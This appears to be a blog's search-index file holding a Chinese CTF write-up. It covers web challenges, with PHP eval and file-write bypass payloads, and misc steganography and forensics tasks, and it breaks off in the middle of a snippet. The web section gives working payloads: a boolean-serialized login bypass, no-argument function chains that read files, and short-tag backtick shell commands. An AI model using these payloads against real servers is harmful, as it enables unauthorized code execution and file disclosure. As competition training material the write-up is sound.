<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第四届海啸杯 writeup</title>
      <link href="posts/20210406.html"/>
      <url>posts/20210406.html</url>
      
        <content type="html"><![CDATA[<p>web &amp; misc &amp; crypto</p><span id="more"></span><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$login</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$unserialize_str</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$unserialize_str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$username</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$unserialize_str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$login</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$login</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"含有危险函数"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"不符合正则表达式"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目可分为两部分，一是通过if语句判断使<code>$login</code>的值变为<code>true</code>，二是通过<code>eval</code>函数执行我们想要的代码拿到flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$unserialize_str</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$unserialize_str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$username</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$unserialize_str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$login</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>虽然我们不知道<code>$usernam</code>和<code>$password</code>的值，但可以在if语句中使用的判断为<code>==</code></p><p>由于php是弱类型语言，所以bool值为true的变量和任何变量比较都相等，除了0和false，因为0认为是bool false</p><p>由此构造<code>$str</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"password"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样便能使<code>$login</code>被赋值为<code>true</code></p><br><p>接下来要执行<code>eval</code>函数，需要通过两个if语句</p><ul><li><code>/[^\W]+\((?R)?\)/</code>要匹配无参数的函数，函数内部可以无限嵌套相同的模式，也就是说只匹配<code>字符串+()</code>的类型，并且括号内为<code>空字符串</code>或<code>字符串+()</code></li><li>不能使用<code>highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode</code>这些危险函数，包括大小写</li></ul><p><code>scandir()</code>函数返回指定目录中的文件和目录的数组，所以<code>scandir(&#39;.&#39;)</code>会返回当前文件所在文件夹的目录</p><blockquote><p>var_dump(scandir(‘.’));</p></blockquote><p>但这样无法通过正则表达式，需要讲scandir内部替换为<code>/[^\W]+\((?R)?\)/</code></p><p><code>chr()</code>函数会返回指定的 ASCII 值对应的字符，而<code>.</code>对应的ASCII值为<code>46</code></p><p>由此构造出：<code>var_dump(scandir(chr(46)));</code></p><p>现在只需要想办法讲构造出一个返回值为46的嵌套函数即可。</p><br><p>查看php版本</p><pre class="line-numbers language-none"><code class="language-none">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>版本号为：<code>7.2.24</code></p><p><code>phpversion()</code>返回<code>7.2.24-0ubuntu0.18.04.7</code></p><p><code>floor(phpversion())</code>返回<code>7</code></p><p><code>sin(floor(phpversion()))</code>返回<code>0.65698659871879</code></p><p><code>sin(sin(floor(phpversion())))</code>返回<code>0.61073350824527</code></p><p><code>cos(sin(sin(floor(phpversion()))))</code>返回<code>0.81922759437835</code></p><p><code>rad2deg(cos(sin(sin(floor(phpversion())))))</code>返回<code>46.938283618535</code></p><p><code>floor(rad2deg(cos(sin(sin(floor(phpversion()))))))</code>返回<code>46</code></p><p>这样便构造出<code>46</code>了</p><pre class="line-numbers language-none"><code class="language-none">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;var_dump(scandir(chr(floor(rad2deg(cos(sin(sin(floor(phpversion())))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回</p><pre class="line-numbers language-none"><code class="language-none">array(5) &#123; [0]&#x3D;&gt; string(1) &quot;.&quot; [1]&#x3D;&gt; string(2) &quot;..&quot; [2]&#x3D;&gt; string(9) &quot;.DS_Store&quot; [3]&#x3D;&gt; string(9) &quot;index.php&quot; [4]&#x3D;&gt; string(16) &quot;this_is_flag.php&quot; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在<code>this_is_flag.php</code>中，刚好在最后一个文件，通过<code>end()</code>读取最后一个文件，再通过<code>show_source()</code>打印，这样就得到最终的payload：</p><pre class="line-numbers language-none"><code class="language-none">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;show_source(end(scandir(chr(floor(rad2deg(cos(sin(sin(floor(phpversion()))))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>附：</p><pre class="line-numbers language-none"><code class="language-none">php 5.x?code&#x3D;var_dump(scandir(chr(floor(rad2deg(sin(cos(cos(floor(phpversion())))))))));?code&#x3D;show_source(end(scandir(chr(floor(rad2deg(sin(cos(cos(floor(phpversion()))))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><h4 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/'| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i"</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// if(preg_match("/'| |_|=|php/",$input))&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'sandbox/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'upload'</span><span class="token punctuation">:</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$dir</span></span>"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先查看下<code>file_put_contents()</code>要写入的文件的位置</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;pwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到：</p><pre class="line-numbers language-none"><code class="language-none">sandbox&#x2F;d65ad202e966d8bef3d5042ce9e0b877&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>过滤了<code>php</code>，用短标签绕过，过滤了空格，用<code>%09</code>代替</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls%09&#x2F;&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问<code>http://xxx/sandbox/d65ad202e966d8bef3d5042ce9e0b877/</code>，得到</p><pre class="line-numbers language-none"><code class="language-none">bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var xxxaf14gss.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取<code>xxxafl4gss.php</code></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;xxxaf14gss.*&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次访问<code>http://xxx/sandbox/d65ad202e966d8bef3d5042ce9e0b877/</code>即可拿到flag</p><br><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="隐藏的书"><a href="#隐藏的书" class="headerlink" title="隐藏的书"></a>隐藏的书</h4><p>用WinRAR打开<code>隐藏的书.zip</code>，可以看到：</p><p>PDF的CRC32校验码为：<code>3EAABDDE</code></p><p>压缩后的大小为：366699字节，转为十六进制为<code>0005986B</code></p><p>用<code>010editor</code>打开<code>隐藏的书.zip</code>，修改对应的值，便可以解压压缩包拿到PDF文件</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrssI.png"></p><p>从PDF中可以知道<code>flag.txt</code>为flag通过某种编码的结果</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrrQA.png"></p><p>从流程图可知：该内容不存在隐藏信息</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrgdf.png"></p><p>所以，<code>Hello.</code>之后的内容为十六进制的ASCII码，转为对应的字符即可得到flag</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrBzd.png"></p><br><h4 id="你能看到图片里的flag吗"><a href="#你能看到图片里的flag吗" class="headerlink" title="你能看到图片里的flag吗"></a>你能看到图片里的flag吗</h4><p>用Stegsolve打开<code>key.gif</code>查看详细信息，发现不是每一帧的时间都相同，时间间隔不是20就是30，考虑gif时间隐写</p><p><img src="https://z3.ax1x.com/2021/04/09/cUryLt.png"></p><p>用kali自带的工具提取时间间隔</p><pre class="line-numbers language-none"><code class="language-none">identify -format &quot;%T&quot; key.gif<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到：</p><pre class="line-numbers language-none"><code class="language-none">20303020303020302030302020302020202030302030203020302030303030302030302030202020203030202030203020303030202030202030302020302030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将<code>20</code>替换为<code>0</code>，<code>30</code>替换为<code>1</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"20303020303020302030302020302020202030302030203020302030303030302030302030202020203030202030203020303030202030202030302020302030"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'20'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'30'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到：</p><pre class="line-numbers language-none"><code class="language-none">0110110101100100001101010101111101101000011001010111001001100101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过网站在线转换二进制到字符串：<a href="http://www.txttool.com/wenben_binarystr.asp%EF%BC%8C%E5%BE%97%E5%88%B0%EF%BC%9A">http://www.txttool.com/wenben_binarystr.asp，得到：</a></p><pre class="line-numbers language-none"><code class="language-none">md5_here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>md5加密后得到：</p><pre class="line-numbers language-none"><code class="language-none">623a3f3d828099e440475ce285c341ac<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即为<code>hint.rar</code>的密码</p><p>解压之后得到两个文件</p><ul><li>hint.txt</li></ul><pre class="line-numbers language-none"><code class="language-none">使用邻近法放缩图片图片的宽度和高度在width_height.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>width_height.txt</li></ul><p>显然<code>width_height.txt</code>是一组坐标的集合，通过python将这些坐标输出到图片上</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageimg <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'width_height.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>img<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会得到一张二维码</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrceP.png"></p><p>扫码得到：</p><pre class="line-numbers language-none"><code class="language-none">width:192 height:90<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后通过PS打开<code>flag.png</code>，按住<code>Ctrl+alt+I</code>调整图片大小</p><p>宽度：192，高度：90，使用近邻法放缩</p><p><img src="https://z3.ax1x.com/2021/04/09/cUr2o8.png"></p><ul><li>flag</li></ul><pre class="line-numbers language-none"><code class="language-none">flag&#123;Th1s_1s_4_h1dden_F14g&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h4 id="神秘的铃声"><a href="#神秘的铃声" class="headerlink" title="神秘的铃声"></a>神秘的铃声</h4><p>用010editor打开<code>flag.wav</code>，发现后面有一大串字符串，保存为<code>test.txt</code></p><p><img src="https://z3.ax1x.com/2021/04/09/cUrWFS.png"></p><p>base64解码后发现PK头，保存为zip文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'test.zip'</span><span class="token punctuation">;</span><span class="token variable">$zip_fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$zip_fp</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>zip文件需要密码，重新回到<code>flag.wav</code>文件，用Audacity打开频谱图</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrOFU.png"></p><p>看了writeup才知道这是DTMF信号，对照表可以得到：<code>D#*C9A16B</code></p><p><img src="https://z3.ax1x.com/2021/04/09/cUrhWQ.png"></p><p>在线网站：<a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p><img src="https://z3.ax1x.com/2021/04/09/cUr4zj.png"></p><p>解压得到一个txt文件，看起来是坐标，用python输出到一张白背景图上，得到一张二维码，扫码即可得到flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageimg <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>img<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="神秘的网站"><a href="#神秘的网站" class="headerlink" title="神秘的网站"></a>神秘的网站</h4><p>用Wireshark打开，根据提示，发现HTTP包中有个很大的上传包，另存下来分析</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrIQs.png"></p><p>用010editor打开，发现zip压缩包，重命名为<code>flag.zip</code></p><p><img src="https://z3.ax1x.com/2021/04/09/cUroyn.png"></p><p>解压后得到一个文件：<code>flag</code>，用010editor打开，发现文件尾为反过来的zip头</p><p><img src="https://z3.ax1x.com/2021/04/09/cUrTLq.png"></p><p>将内容反转并保存为zip文件，保存后的<code>flag.zip</code>需要密码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token 